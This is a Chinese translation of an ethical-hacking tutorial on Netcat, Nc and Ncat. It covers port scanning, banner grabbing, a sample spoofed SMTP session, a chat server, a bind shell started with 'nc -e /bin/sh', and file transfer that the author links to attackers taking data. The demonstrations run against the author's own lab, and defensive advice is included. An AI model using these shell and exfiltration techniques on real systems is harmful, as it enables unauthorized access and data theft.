<html>
<head>
<title>Transferring data and remote control</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">传输数据和远程控制</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/ethical-hacking-part-15-netcat-nc-and-netcat-f6a8f7df43fd?source=collection_archive---------0-----------------------#2020-11-07">https://levelup.gitconnected.com/ethical-hacking-part-15-netcat-nc-and-netcat-f6a8f7df43fd?source=collection_archive---------0-----------------------#2020-11-07</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="ce3b" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">使用Netcat、Nc和Ncat传输数据或远程控制系统</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/ae8d5cd90124f95192c18704f7c79621.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_QM3rduA35wjmCN3BcKjCw.jpeg"/></div></div></figure><p id="1d18" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated"><a class="ae lq" href="http://netcat.sourceforge.net/" rel="noopener ugc nofollow" target="_blank"> Netcat </a>或缩写<a class="ae lq" href="http://netcat.sourceforge.net/" rel="noopener ugc nofollow" target="_blank"> Nc </a>由“霍比特人”于1995年10月开发，被官方认为是网络管理工具。然而，它对道德黑客和渗透测试非常有帮助。它可以在所有Linux和macOS操作系统上使用。我相信也有运行在Windows上的非官方版本。</p><p id="06a1" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">然而<a class="ae lq" href="https://nmap.org/ncat/" rel="noopener ugc nofollow" target="_blank"> Ncat </a>并不等同于<a class="ae lq" href="http://netcat.sourceforge.net/" rel="noopener ugc nofollow" target="_blank"> Netcat </a>或<a class="ae lq" href="http://netcat.sourceforge.net/" rel="noopener ugc nofollow" target="_blank"> Nc </a>。这确实造成了很多混乱。它基于Netcat，但是被Nmap项目开发成一个更加复杂的工具。</p><p id="fb38" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这就是<a class="ae lq" href="http://netcat.sourceforge.net/" rel="noopener ugc nofollow" target="_blank"> Netcat </a>帮助的样子…</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="36f8" class="lw lx it ls b gy ly lz l ma mb">kali@kali:~$ <strong class="ls iu">nc -h</strong><br/>[v1.10-46]<br/>connect to somewhere: nc [-options] hostname port[s] [ports] ... <br/>listen for inbound: nc -l -p port [-options] [hostname] [port]<br/>options:<br/> -c shell commands as `-e'; use /bin/sh to exec [dangerous!!]<br/> -e filename  program to exec after connect [dangerous!!]<br/> -b   allow broadcasts<br/> -g gateway  source-routing hop point[s], up to 8<br/> -G num   source-routing pointer: 4, 8, 12, ...<br/> -h   this cruft<br/> -i secs   delay interval for lines sent, ports scanned<br/>        -k                      set keepalive option on socket<br/> -l   listen mode, for inbound connects<br/> -n   numeric-only IP addresses, no DNS<br/> -o file   hex dump of traffic<br/> -p port   local port number<br/> -r   randomize local and remote ports<br/> -q secs   quit after EOF on stdin and delay of secs<br/> -s addr   local source address<br/> -T tos   set Type Of Service<br/> -t   answer TELNET negotiation<br/> -u   UDP mode<br/> -v   verbose [use twice to be more verbose]<br/> -w secs   timeout for connects and final net reads<br/> -C   Send CRLF as line-ending<br/> -z   zero-I/O mode [used for scanning]<br/>port numbers can be individual or ranges: lo-hi [inclusive];<br/>hyphens in port names must be backslash escaped (e.g. 'ftp\-data').<br/>kali@kali:~$</span></pre><p id="0731" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">与<a class="ae lq" href="https://nmap.org/ncat/" rel="noopener ugc nofollow" target="_blank"> Ncat </a> help的样子相比…</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="15ad" class="lw lx it ls b gy ly lz l ma mb">kali@kali:~$ ncat -h<br/>Ncat 7.91 ( <a class="ae lq" href="https://nmap.org/ncat" rel="noopener ugc nofollow" target="_blank">https://nmap.org/ncat</a> )<br/>Usage: ncat [options] [hostname] [port]</span><span id="a54c" class="lw lx it ls b gy mc lz l ma mb">Options taking a time assume seconds. Append 'ms' for milliseconds,<br/>'s' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms).<br/>  -4                         Use IPv4 only<br/>  -6                         Use IPv6 only<br/>  -U, --unixsock             Use Unix domain sockets only<br/>      --vsock                Use vsock sockets only<br/>  -C, --crlf                 Use CRLF for EOL sequence<br/>  -c, --sh-exec &lt;command&gt;    Executes the given command via /bin/sh<br/>  -e, --exec &lt;command&gt;       Executes the given command<br/>      --lua-exec &lt;filename&gt;  Executes the given Lua script<br/>  -g hop1[,hop2,...]         Loose source routing hop points (8 max)<br/>  -G &lt;n&gt;                     Loose source routing hop pointer (4, 8, 12, ...)<br/>  -m, --max-conns &lt;n&gt;        Maximum &lt;n&gt; simultaneous connections<br/>  -h, --help                 Display this help screen<br/>  -d, --delay &lt;time&gt;         Wait between read/writes<br/>  -o, --output &lt;filename&gt;    Dump session data to a file<br/>  -x, --hex-dump &lt;filename&gt;  Dump session data as hex to a file<br/>  -i, --idle-timeout &lt;time&gt;  Idle read/write timeout<br/>  -p, --source-port port     Specify source port to use<br/>  -s, --source addr          Specify source address to use (doesn't affect -l)<br/>  -l, --listen               Bind and listen for incoming connections<br/>  -k, --keep-open            Accept multiple connections in listen mode<br/>  -n, --nodns                Do not resolve hostnames via DNS<br/>  -t, --telnet               Answer Telnet negotiations<br/>  -u, --udp                  Use UDP instead of default TCP<br/>      --sctp                 Use SCTP instead of default TCP<br/>  -v, --verbose              Set verbosity level (can be used several times)<br/>  -w, --wait &lt;time&gt;          Connect timeout<br/>  -z                         Zero-I/O mode, report connection status only<br/>      --append-output        Append rather than clobber specified output files<br/>      --send-only            Only send data, ignoring received; quit on EOF<br/>      --recv-only            Only receive data, never send anything<br/>      --no-shutdown          Continue half-duplex when receiving EOF on stdin<br/>      --allow                Allow only given hosts to connect to Ncat<br/>      --allowfile            A file of hosts allowed to connect to Ncat<br/>      --deny                 Deny given hosts from connecting to Ncat<br/>      --denyfile             A file of hosts denied from connecting to Ncat<br/>      --broker               Enable Ncat's connection brokering mode<br/>      --chat                 Start a simple Ncat chat server<br/>      --proxy &lt;addr[:port]&gt;  Specify address of host to proxy through<br/>      --proxy-type &lt;type&gt;    Specify proxy type ("http", "socks4", "socks5")<br/>      --proxy-auth &lt;auth&gt;    Authenticate with HTTP or SOCKS proxy server<br/>      --proxy-dns &lt;type&gt;     Specify where to resolve proxy destination<br/>      --ssl                  Connect or listen with SSL<br/>      --ssl-cert             Specify SSL certificate file (PEM) for listening<br/>      --ssl-key              Specify SSL private key (PEM) for listening<br/>      --ssl-verify           Verify trust and domain name of certificates<br/>      --ssl-trustfile        PEM file containing trusted SSL certificates<br/>      --ssl-ciphers          Cipherlist containing SSL ciphers to use<br/>      --ssl-servername       Request distinct server name (SNI)<br/>      --ssl-alpn             ALPN protocol list to use<br/>      --version              Display Ncat's version information and exit</span><span id="22e5" class="lw lx it ls b gy mc lz l ma mb">See the ncat(1) manpage for full options, descriptions and usage examples</span></pre><p id="6ac8" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你可以看到它们很相似，但是<a class="ae lq" href="https://nmap.org/ncat/" rel="noopener ugc nofollow" target="_blank"> Ncat </a>有更多的功能。</p><p id="a7cf" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">在我的另一篇文章“道德黑客(第八部分):漏洞分析”中，我介绍了NMAP，它经常被用于端口扫描。Netcat也可以用于端口扫描，速度非常快。</p><p id="ff59" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这就是从端口20–25扫描主机192.168.1.2的方式。正如您所看到的，在我的Kali linux实例上检测到SSH是打开的。我在我的Mac上进行了这次扫描。</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="2c86" class="lw lx it ls b gy ly lz l ma mb">% <strong class="ls iu">nc -zv 192.168.1.2 20-25</strong><br/>nc: connectx to 192.168.1.2 port 20 (tcp) failed: Connection refused<br/>nc: connectx to 192.168.1.2 port 21 (tcp) failed: Connection refused<br/>Connection to 192.168.1.2 port 22 [tcp/ssh] succeeded!<br/>nc: connectx to 192.168.1.2 port 23 (tcp) failed: Connection refused<br/>nc: connectx to 192.168.1.2 port 24 (tcp) failed: Connection refused<br/>nc: connectx to 192.168.1.2 port 25 (tcp) failed: Connection refused</span></pre><h2 id="1eb9" class="lw lx it bd md me mf dn mg mh mi dp mj ld mk ml mm lh mn mo mp ll mq mr ms mt bi translated">抢横幅</h2><p id="53ce" class="pw-post-body-paragraph ku kv it kw b kx mu ju kz la mv jx lc ld mw lf lg lh mx lj lk ll my ln lo lp im bi translated">我们可以看到TCP 22 (SSH)在我的Kali实例上是打开的。我们现在要做的是找出那个SSH服务器使用的是什么服务和版本。这是通过名为“<strong class="kw iu">横幅抓取</strong>”的过程完成的。</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="8182" class="lw lx it ls b gy ly lz l ma mb">% <strong class="ls iu">nc -nv 192.168.1.2 22</strong><br/>Connection to 192.168.1.2 port 22 [tcp/*] succeeded!<br/>SSH-2.0-OpenSSH_8.3p1 Debian-1</span></pre><p id="190e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如您所见，在我的Kali linux实例上运行的SSH服务器是SSH-2.0-OpenSSH_8.3p1。这对我们很有用，因为我们可以在<a class="ae lq" href="https://www.exploit-db.com/" rel="noopener ugc nofollow" target="_blank">漏洞数据库</a>中查找它，看看是否有任何已知的漏洞。我查了一下“<strong class="kw iu"> openssh 8.3 </strong>，没有已知的漏洞。如果你在它的开启上寻找“<strong class="kw iu"> openssh </strong>”，相反你可以看到许多已知的漏洞。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi mz"><img src="../Images/f3e3df065101280b3df416f1c6c94e11.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*axtbr3gaNELZlDdeQI8NaQ.png"/></div></div></figure><p id="41cb" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">就网络安全和强化网络而言，这就是为什么如果可以的话，禁用服务横幅总是一个好主意。默认情况下，大多数(如果不是全部)服务将显示横幅，但许多服务允许您在配置中关闭它。</p><p id="25c3" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您可能已经注意到，当您运行标题抓取命令时，该命令没有退出。这是因为它已经打开了到允许您发送数据的服务的连接。为了演示这一点，我在TCP 80上的Kali linux实例上安装并启动了Apache 2。</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="03f0" class="lw lx it ls b gy ly lz l ma mb">% <strong class="ls iu">nc -nv 192.168.1.2 80</strong><br/>Connection to 192.168.1.2 port 80 [tcp/*] succeeded!</span></pre><p id="c43d" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">好消息是没有横幅，所以Apache正在做开箱即用的正确事情。您还会注意到它现在正在等待输入。</p><p id="d92e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">让我们试着发送一些东西…</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="df01" class="lw lx it ls b gy ly lz l ma mb">% <strong class="ls iu">nc -nv 192.168.1.2 80</strong><br/>Connection to 192.168.1.2 port 80 [tcp/*] succeeded!<br/><strong class="ls iu">GET / HTTP/1.1</strong><br/>HTTP/1.1 400 Bad Request<br/>Date: Sat, 07 Nov 2020 13:19:45 GMT<br/>Server: Apache/2.4.46 (Debian)<br/>Content-Length: 311<br/>Connection: close<br/>Content-Type: text/html; charset=iso-8859-1</span><span id="06de" class="lw lx it ls b gy mc lz l ma mb">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;<br/>&lt;html&gt;&lt;head&gt;<br/>&lt;title&gt;400 Bad Request&lt;/title&gt;<br/>&lt;/head&gt;&lt;body&gt;<br/>&lt;h1&gt;Bad Request&lt;/h1&gt;<br/>&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;<br/>&lt;/p&gt;<br/>&lt;hr&gt;<br/>&lt;address&gt;Apache/2.4.46 (Debian) Server at kali.security.local Port 80&lt;/address&gt;<br/>&lt;/body&gt;&lt;/html&gt;</span></pre><p id="f8e1" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我发送了“<strong class="kw iu"> GET / HTTP/1.1 </strong>”，得到了服务器的HTTP响应。有趣的是，虽然没有显示横幅，但我仍然可以在响应中看到版本“<strong class="kw iu">Apache/2 . 4 . 46(Debian)Server</strong>”。</p><p id="3ee5" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果目标系统在TCP 25上运行SMTP服务器，并且配置不当，您可能会从该系统发送未经请求的电子邮件。</p><p id="9e87" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">也许是这样的…</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="7c65" class="lw lx it ls b gy ly lz l ma mb">HELO mail<br/>MAIL FROM: &lt;attacker@somedomain.com&gt;<br/>RCPT TO: &lt;victim@anotherdomain.com&gt;<br/>Subject: This is a test<br/>Data<br/>This is a test<br/>.</span></pre><p id="ec17" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您还可以尝试向各种服务发送一些诊断命令，看看是否能得到有用的响应。例如，你可以尝试发送“<strong class="kw iu"> HELP </strong>”，看看你会得到什么样的回应。</p><h2 id="14b8" class="lw lx it bd md me mf dn mg mh mi dp mj ld mk ml mm lh mn mo mp ll mq mr ms mt bi translated">简单聊天服务器</h2><p id="cfcc" class="pw-post-body-paragraph ku kv it kw b kx mu ju kz la mv jx lc ld mw lf lg lh mx lj lk ll my ln lo lp im bi translated">您还可以使用Netcat创建一个服务器来监听特定的端口。例如，这就是如何在TCP端口3000上使用Netcat创建服务器。您可以监听当前未使用的任何端口。</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="d654" class="lw lx it ls b gy ly lz l ma mb">kali@kali:~$ <strong class="ls iu">nc -lvp 3000</strong><br/>Ncat: Version 7.91 ( <a class="ae lq" href="https://nmap.org/ncat" rel="noopener ugc nofollow" target="_blank">https://nmap.org/ncat</a> )<br/>Ncat: Listening on :::3000<br/>Ncat: Listening on 0.0.0.0:3000</span></pre><p id="f57a" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我现在将使用前面相同的方法从我的Mac连接到Kali实例。</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="43ee" class="lw lx it ls b gy ly lz l ma mb">% <strong class="ls iu">nc -nv 192.168.1.2 3000</strong><br/>Connection to 192.168.1.2 port 3000 [tcp/*] succeeded!</span></pre><p id="55ac" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我现在可以看到我们已经连接到服务器上了。</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="bd12" class="lw lx it ls b gy ly lz l ma mb">kali@kali:~$ <strong class="ls iu">nc -lvp 3000</strong><br/>Ncat: Version 7.91 ( <a class="ae lq" href="https://nmap.org/ncat" rel="noopener ugc nofollow" target="_blank">https://nmap.org/ncat</a> )<br/>Ncat: Listening on :::3000<br/>Ncat: Listening on 0.0.0.0:3000<br/><strong class="ls iu">Ncat: Connection from 192.168.1.1.<br/>Ncat: Connection from 192.168.1.1:54385.</strong></span></pre><p id="0486" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我们现在有了客户端和服务器之间的双向通信，如从客户端到服务器所演示的。</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="6988" class="lw lx it ls b gy ly lz l ma mb">% <strong class="ls iu">nc -nv 192.168.1.2 3000</strong><br/>Connection to 192.168.1.2 port 3000 [tcp/*] succeeded!<br/><strong class="ls iu">Is anyone there?</strong></span><span id="7e52" class="lw lx it ls b gy mc lz l ma mb">kali@kali:~$ <strong class="ls iu">nc -lvp 3000</strong><br/>Ncat: Version 7.91 ( <a class="ae lq" href="https://nmap.org/ncat" rel="noopener ugc nofollow" target="_blank">https://nmap.org/ncat</a> )<br/>Ncat: Listening on :::3000<br/>Ncat: Listening on 0.0.0.0:3000<br/>Ncat: Connection from 192.168.1.1.<br/>Ncat: Connection from 192.168.1.1:54385.<br/><strong class="ls iu">Is anyone there?</strong></span></pre><p id="8ec7" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我们也可以从服务器向客户端演示这一点。</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="dcfa" class="lw lx it ls b gy ly lz l ma mb">kali@kali:~$ <strong class="ls iu">nc -lvp 3000</strong><br/>Ncat: Version 7.91 ( <a class="ae lq" href="https://nmap.org/ncat" rel="noopener ugc nofollow" target="_blank">https://nmap.org/ncat</a> )<br/>Ncat: Listening on :::3000<br/>Ncat: Listening on 0.0.0.0:3000<br/>Ncat: Connection from 192.168.1.1.<br/>Ncat: Connection from 192.168.1.1:54385.<br/>Is anyone there?<br/><strong class="ls iu">Yes, it's me</strong></span><span id="0dab" class="lw lx it ls b gy mc lz l ma mb">% <strong class="ls iu">nc -nv 192.168.1.2 3000</strong><br/>Connection to 192.168.1.2 port 3000 [tcp/*] succeeded!<br/>Is anyone there?<br/><strong class="ls iu">Yes, it's me</strong></span></pre><p id="3015" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这可以用来在网络上的两个管理员之间建立一个快速聊天服务器。</p><p id="e0d7" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">当我们创建我们的服务器时，我们也可以执行一个命令，例如一个shell。在Linux上你可以使用“<strong class="kw iu"> /bin/sh </strong>”，或者在Windows上你可以使用“<strong class="kw iu">cmd.exe</strong>”。让我们来看看这是怎么回事…</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="0453" class="lw lx it ls b gy ly lz l ma mb">kali@kali:~$ <strong class="ls iu">nc -lvp 3000 -e /bin/sh</strong><br/>Ncat: Version 7.91 ( <a class="ae lq" href="https://nmap.org/ncat" rel="noopener ugc nofollow" target="_blank">https://nmap.org/ncat</a> )<br/>Ncat: Listening on :::3000<br/>Ncat: Listening on 0.0.0.0:3000</span></pre><p id="6779" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">并与我们的客户建立联系…</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="50d7" class="lw lx it ls b gy ly lz l ma mb">% <strong class="ls iu">nc 192.168.1.2 3000</strong><br/><strong class="ls iu">whoami</strong><br/>kali<br/><strong class="ls iu">cd /etc</strong><br/><strong class="ls iu">ls -la | wc -l</strong><br/>292</span></pre><p id="b291" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如你所见，我执行了“<strong class="kw iu"> whoami </strong>”并收到了我的卡利用户名“<strong class="kw iu">卡利</strong>”。我把目录改成，“<strong class="kw iu"> /etc </strong>”，统计文件和目录。在这种情况下有292个项目。这非常强大，但也非常危险，所以在尝试时要小心。这就像通过SSH或Telnet向系统提供一个shell，但是没有提示。</p><h2 id="a261" class="lw lx it bd md me mf dn mg mh mi dp mj ld mk ml mm lh mn mo mp ll mq mr ms mt bi translated">传输文件</h2><p id="e76b" class="pw-post-body-paragraph ku kv it kw b kx mu ju kz la mv jx lc ld mw lf lg lh mx lj lk ll my ln lo lp im bi translated">Netcat的另一个极其强大的特性是能够通过Netcat传输文件。这是攻击者从目标系统获取文件的典型方式。一般来说，良好的安全实践是不要在您的任何系统上安装"<strong class="kw iu"> netcat </strong>"、"<strong class="kw iu"> nc </strong>"或"<strong class="kw iu"> ncat </strong>"，因为如果攻击者获得了您系统的访问权限，从系统上取走文件将变得轻而易举。您可能认为攻击者很难进入您的系统来运行这个程序，但实际上一点也不难。如果你读过我以前的文章，你会发现有很多方法可以做到这一点，从反向外壳，浏览器攻击，利用web服务中的漏洞，或任何其他服务。</p><p id="3b0a" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">你可能会误以为你的防火墙在保护你。我工作过的几乎所有网络都控制入站访问，允许所有出站访问。比方说，你只允许TCP 443入站到你的web服务器，但允许所有东西出站，这是很典型的。如果您能够通过利用PHP入侵网站，您可以运行一个命令从web服务器连接到您的远程Netcat服务器。如果你熟悉防火墙的概念，你会知道今天的大多数防火墙是有状态的。换句话说，你建立的连接会自动打开“针孔”以允许连接工作。正如我在Netcat中解释的那样，连接是双向的("<strong class="kw iu">双向</strong>")，因此您所需要的只是将web服务器连接到您的Netcat服务器，以便您能够连接回来。</p><p id="0537" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您可能想知道如何防范这种情况，答案很简单。如果可能，控制web服务器的出站访问。这往往说起来容易做起来难。您应该以专用用户和组的身份运行web服务器，并具有最低限度的访问权限。用户应该只能运行您的web服务器，而不能运行其他任何东西。绝对不允许它运行任何类似“<strong class="kw iu"> nc </strong>”的系统命令。我见过的最常见的情况是web服务器作为根用户或拥有超出所需权限的用户运行。</p><p id="d0fd" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">让我们看一个如何将文件从一个系统复制到另一个系统的例子。</p><p id="0e28" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我已经启动了一个Netcat服务器，并将所有输出通过管道传输到名为“<strong class="kw iu"> reveivedfile </strong>”的文件中。你可以用任何扩展名来称呼它。这将包含我们要发送的文件。</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="8a7e" class="lw lx it ls b gy ly lz l ma mb">kali@kali:~$ <strong class="ls iu">nc -lvp 3000 &gt; receivedfile</strong><br/>Ncat: Version 7.91 ( <a class="ae lq" href="https://nmap.org/ncat" rel="noopener ugc nofollow" target="_blank">https://nmap.org/ncat</a> )<br/>Ncat: Listening on :::3000<br/>Ncat: Listening on 0.0.0.0:3000</span></pre><p id="ed97" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我为自己创建了一个要发送的样本文件，并像这样发送它…</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="c54d" class="lw lx it ls b gy ly lz l ma mb">% <strong class="ls iu">cat sendfile </strong><br/>This is a test</span><span id="b4df" class="lw lx it ls b gy mc lz l ma mb">% <strong class="ls iu">cat sendfile | nc 192.168.1.2 3000</strong></span></pre><p id="ea71" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">现在让我们在Netcat服务器上查看它是否被接收到…</p><pre class="kj kk kl km gt lr ls lt lu aw lv bi"><span id="3333" class="lw lx it ls b gy ly lz l ma mb">kali@kali:~$ <strong class="ls iu">nc -lvp 3000 &gt; receivedfile</strong><br/>Ncat: Version 7.91 ( <a class="ae lq" href="https://nmap.org/ncat" rel="noopener ugc nofollow" target="_blank">https://nmap.org/ncat</a> )<br/>Ncat: Listening on :::3000<br/>Ncat: Listening on 0.0.0.0:3000<br/>Ncat: Connection from 192.168.1.1.<br/>Ncat: Connection from 192.168.1.1:55044.</span><span id="7e63" class="lw lx it ls b gy mc lz l ma mb">kali@kali:~$ <strong class="ls iu">cat receivedfile </strong><br/>This is a test</span></pre><p id="1065" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我希望你觉得这篇文章有趣并且有用。如果您想随时了解情况，请不要忘记关注我，注册我的<a class="ae lq" href="https://whittle.medium.com/subscribe" rel="noopener">电子邮件通知</a>。</p><h1 id="c5fb" class="na lx it bd md nb nc nd mg ne nf ng mj jz nh ka mm kc ni kd mp kf nj kg ms nk bi translated">迈克尔·惠特尔</h1><ul class=""><li id="4a1c" class="nl nm it kw b kx mu la mv ld nn lh no ll np lp nq nr ns nt bi translated"><strong class="kw iu"> <em class="nu">如果你喜欢这个，请</em> </strong> <a class="ae lq" href="https://whittle.medium.com/" rel="noopener"> <strong class="kw iu"> <em class="nu">跟我上媒</em> </strong> </a></li><li id="a997" class="nl nm it kw b kx nv la nw ld nx lh ny ll nz lp nq nr ns nt bi translated"><strong class="kw iu"> <em class="nu">更多有趣的文章，请</em> </strong> <a class="ae lq" href="https://medium.com/trading-data-analysis" rel="noopener"> <strong class="kw iu"> <em class="nu">关注我的刊物</em> </strong> </a></li><li id="fad1" class="nl nm it kw b kx nv la nw ld nx lh ny ll nz lp nq nr ns nt bi translated"><strong class="kw iu"> <em class="nu">有兴趣合作吗？</em> </strong> <a class="ae lq" href="https://www.linkedin.com/in/miwhittle/" rel="noopener ugc nofollow" target="_blank"> <strong class="kw iu"> <em class="nu">我们上领英</em> </strong> </a>连线吧</li><li id="35ce" class="nl nm it kw b kx nv la nw ld nx lh ny ll nz lp nq nr ns nt bi translated"><strong class="kw iu"> <em class="nu">支持我和其他媒体作者</em> </strong> <a class="ae lq" href="https://whittle.medium.com/membership" rel="noopener"> <strong class="kw iu"> <em class="nu">在此报名</em> </strong> </a></li><li id="ffa6" class="nl nm it kw b kx nv la nw ld nx lh ny ll nz lp nq nr ns nt bi translated"><strong class="kw iu"> <em class="nu">请别忘了为文章鼓掌:)←谢谢！</em>T45】</strong></li></ul></div></div>    
</body>
</html>